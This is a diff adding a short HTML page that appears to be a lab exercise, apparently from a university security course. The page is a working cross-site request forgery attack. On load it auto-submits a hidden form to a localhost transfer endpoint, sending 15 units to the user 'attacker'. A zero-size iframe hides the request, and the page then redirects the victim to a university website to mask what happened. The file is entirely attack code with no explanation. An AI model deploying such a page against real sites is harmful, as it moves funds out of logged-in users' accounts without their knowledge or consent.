@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+
+<head>
+    <meta charset="utf-8">
+    <script>
+        var flag = false;
+        function transfer() {
+            document.getElementById("transfer").submit();
+            flag = true;
+        }
+        function to_ustc() {
+            if (flag) {
+                window.location.replace("https://cs.ustc.edu.cn/");
+                // console.log("ok");
+            }
+        }
+    </script>
+</head>
+
+<body onload="transfer()">
+    <form id="transfer" action="http://localhost:3000/post_transfer" target="hidden_iframe" method="post">
+        <input type="hidden" name="destination_username" value="attacker">
+        <input type="hidden" name="quantity" value="15">
+    </form>
+    <iframe name="hidden_iframe" style="width: 0; height: 0; border: none;" onload="to_ustc()"></iframe>
+</body>
